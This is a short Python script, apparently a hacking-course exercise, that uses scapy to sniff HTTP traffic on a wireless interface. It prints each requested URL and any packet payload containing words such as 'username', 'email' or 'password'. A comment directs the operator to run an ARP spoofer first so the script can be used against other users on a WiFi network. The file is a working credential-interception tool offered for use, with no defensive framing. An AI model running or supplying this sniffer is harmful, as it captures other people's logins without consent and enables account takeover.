#!/usr/bin/env python
import scapy.all as scapy
#for http packets
from scapy.layers import http


# RUN ARP SPOOFER FOR EXTERNAL WIFI NETWORK ATTACKS !!!!


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_loginifo(packet):
    if packet.haslayer(scapy.Raw):
        # raw is the layer change it for diff layer
        load = str(packet[scapy.Raw].load)
        # show all pkt info the password and login info sent in post
        keyword = ["username", "user", "email", "login", "password", "pss", "uname"]
        for k in keyword:
            if k in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        website=get_url(packet)
        # print("[+]HTTP Request >> " + website.decode)
        print("[+]HTTP Request >> " + str(website))
        login_info=get_loginifo(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + str(login_info) + "\n\n")



sniff("wlan0")
